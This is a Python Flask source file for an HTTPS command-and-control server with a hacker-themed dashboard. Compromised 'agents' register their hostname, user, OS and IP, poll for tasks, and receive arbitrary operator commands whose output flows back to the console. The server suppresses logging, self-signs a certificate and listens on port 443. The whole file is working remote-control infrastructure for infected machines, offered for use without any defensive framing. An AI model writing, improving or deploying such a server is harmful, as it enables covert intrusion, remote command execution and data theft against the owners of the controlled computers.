#!/usr/bin/env python3
"""
Robust C2 HTTPS Server with better error handling
"""

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import uuid
import time
import threading
from datetime import datetime
import ssl
import logging
import traceback

# Suppress most logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)

app = Flask(__name__)
CORS(app)

# Data storage
agents = {}
tasks = {}
task_results = {}

# HTML Dashboard
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Framework Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            height: 100vh;
            overflow: hidden;
        }
        .container { display: flex; height: 100vh; }
        .sidebar {
            width: 350px;
            background: #0d1117;
            border-right: 1px solid #00ff41;
            overflow-y: auto;
            padding: 20px;
        }
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .terminal {
            background: #000000;
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .command-bar {
            background: #0d1117;
            border-top: 1px solid #00ff41;
            padding: 15px;
            display: flex;
        }
        .command-bar input {
            background: #000000;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 10px;
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .command-bar button {
            background: #00ff41;
            color: #000000;
            border: none;
            padding: 10px 20px;
            margin-left: 10px;
            cursor: pointer;
            font-weight: bold;
        }
        .agent-item {
            padding: 10px;
            margin: 5px 0;
            background: #1a1f2e;
            cursor: pointer;
            border-left: 3px solid #00ff41;
        }
        .agent-item:hover { background: #2a2f3e; }
        .agent-item.active { background: #00ff41; color: #000000; }
        .agent-info { font-size: 11px; margin-top: 5px; color: #888; }
        .command-output { color: #cccccc; margin: 5px 0 5px 20px; white-space: pre-wrap; }
        .command-line { color: #00ff41; margin: 5px 0; }
        h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 1px solid #00ff41; padding-bottom: 5px; }
        .status-active { color: #00ff41; }
        .status-inactive { color: #ff4444; }
    </style>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <h2>🕶️ C2 Framework</h2>
            <div id="agents-list">Loading...</div>
        </div>
        <div class="main">
            <div class="terminal" id="terminal">
                <div class="command-line">=== C2 Console ===</div>
                <div id="output-area"></div>
            </div>
            <div class="command-bar">
                <input type="text" id="command-input" placeholder="Select agent and type command..." autocomplete="off">
                <button onclick="sendCommand()">Execute</button>
            </div>
        </div>
    </div>
    <script>
        let currentAgent = null;
        
        function loadAgents() {
            fetch('/api/agents')
                .then(res => res.json())
                .then(data => {
                    const container = document.getElementById('agents-list');
                    if (data.length === 0) {
                        container.innerHTML = '<div style="padding:20px;">No agents</div>';
                        return;
                    }
                    container.innerHTML = '<h3>Agents (' + data.length + ')</h3>';
                    data.forEach(agent => {
                        const div = document.createElement('div');
                        div.className = 'agent-item';
                        if (currentAgent === agent.agent_id) div.classList.add('active');
                        div.onclick = () => selectAgent(agent.agent_id);
                        div.innerHTML = '<div><strong>' + agent.agent_id + '</strong></div>' +
                            '<div class="agent-info">' + agent.hostname + '@' + agent.username + '<br>' + agent.os_type + ' | ' + agent.ip_address + '</div>';
                        container.appendChild(div);
                    });
                });
        }
        
        function selectAgent(agentId) {
            currentAgent = agentId;
            addToTerminal('[+] Selected: ' + agentId);
            loadAgents();
        }
        
        function addToTerminal(text) {
            const area = document.getElementById('output-area');
            const div = document.createElement('div');
            div.innerHTML = '<div>' + text + '</div>';
            area.appendChild(div);
            document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
        }
        
        function sendCommand() {
            const input = document.getElementById('command-input');
            const cmd = input.value.trim();
            if (!cmd || !currentAgent) return;
            
            addToTerminal(currentAgent + '# ' + cmd);
            
            fetch('/api/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({agent_id: currentAgent, command: cmd})
            });
            
            input.value = '';
        }
        
        function fetchResults() {
            if (currentAgent) {
                fetch('/api/task_results/' + currentAgent)
                    .then(res => res.json())
                    .then(data => {
                        data.forEach(r => addToTerminal(r.output));
                    });
            }
        }
        
        document.getElementById('command-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCommand();
        });
        
        setInterval(loadAgents, 3000);
        setInterval(fetchResults, 2000);
        loadAgents();
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/register', methods=['POST'])
def register_agent():
    try:
        data = request.json
        agent_id = str(uuid.uuid4())[:8]
        
        agents[agent_id] = {
            'agent_id': agent_id,
            'hostname': data.get('hostname', 'unknown'),
            'username': data.get('username', 'unknown'),
            'os_type': data.get('os_type', 'unknown'),
            'ip_address': data.get('ip_address', request.remote_addr),
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'status': 'active'
        }
        
        print(f"[+] Agent registered: {agent_id} ({data.get('hostname')})")
        return jsonify({'agent_id': agent_id, 'sleep_time': 5})
        
    except Exception as e:
        print(f"[-] Register error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/beacon', methods=['POST'])
def handle_beacon():
    try:
        data = request.json
        agent_id = data.get('agent_id')
        
        if agent_id in agents:
            agents[agent_id]['last_seen'] = datetime.now().isoformat()
            agents[agent_id]['status'] = 'active'
            
            # Get pending tasks
            pending = []
            for tid, task in list(tasks.items()):
                if task.get('agent_id') == agent_id and task.get('status') == 'pending':
                    pending.append({'id': tid, 'command': task['command']})
                    task['status'] = 'sent'
            
            return jsonify({'tasks': pending, 'status': 'ok'})
        else:
            return jsonify({'tasks': []}), 200
            
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return jsonify({'tasks': []}), 200

@app.route('/api/task_result', methods=['POST'])
def task_result():
    try:
        data = request.json
        task_id = data.get('task_id')
        output = data.get('output', '')
        
        if task_id in tasks:
            tasks[task_id]['status'] = 'completed'
            tasks[task_id]['output'] = output
            
            agent_id = tasks[task_id]['agent_id']
            if agent_id not in task_results:
                task_results[agent_id] = []
            task_results[agent_id].append({'output': output})
            
            print(f"[+] Task {task_id} completed")
        
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        print(f"[-] Task result error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    try:
        data = request.json
        task_id = str(uuid.uuid4())[:8]
        
        tasks[task_id] = {
            'id': task_id,
            'agent_id': data.get('agent_id'),
            'command': data.get('command'),
            'status': 'pending',
            'created_at': datetime.now().isoformat()
        }
        
        print(f"[+] Command: {data.get('command')[:50]} -> {data.get('agent_id')}")
        return jsonify({'task_id': task_id, 'status': 'sent'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agents', methods=['GET'])
def list_agents():
    return jsonify(list(agents.values()))

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    pending = []
    for tid, task in tasks.items():
        if task.get('agent_id') == agent_id and task.get('status') == 'pending':
            pending.append({'id': tid, 'command': task['command']})
    return jsonify(pending)

@app.route('/api/task_results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    results = task_results.get(agent_id, [])
    task_results[agent_id] = []
    return jsonify(results)

if __name__ == '__main__':
    print("="*60)
    print("C2 HTTPS Server Starting...")
    print("="*60)
    print(f"[+] Dashboard: https://172.24.1.83:443")
    print(f"[+] API: https://172.24.1.83:443/api")
    print("[+] Press Ctrl+C to stop")
    print("="*60)
    
    # Generate self-signed cert if not exists
    import os
    if not os.path.exists('ssl_cert.pem'):
        os.system('openssl req -x509 -newkey rsa:4096 -nodes -out ssl_cert.pem -keyout ssl_key.pem -days 365 -subj "/C=US/ST=State/L=City/O=C2/CN=172.24.1.83"')
    
    # Run server
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('ssl_cert.pem', 'ssl_key.pem')
    app.run(host='0.0.0.0', port=443, ssl_context=context, debug=False, threaded=True)
